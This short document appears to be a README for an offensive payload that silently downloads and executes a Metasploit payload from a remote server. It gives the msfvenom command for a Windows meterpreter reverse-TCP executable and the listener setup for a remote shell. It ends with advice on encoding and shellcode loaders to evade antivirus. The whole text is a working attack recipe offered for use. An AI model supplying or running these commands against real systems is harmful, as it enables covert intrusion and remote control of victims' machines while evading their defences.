# Metasploit Payload Download & Execute

Downloads a Metasploit-generated payload from a remote server and executes it silently.

- **Requirements:**
  - Replace `PAYLOAD_URL` with the URL hosting your msfvenom payload
  - Run `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > payload.exe` to generate
  - Set up Metasploit listener: `use exploit/multi/handler`, `set payload windows/x64/meterpreter/reverse_tcp`, `run`
- **Note:** Windows Defender and most AV will flag default msfvenom payloads. Use encoding, custom templates, or shellcode loaders to evade detection.
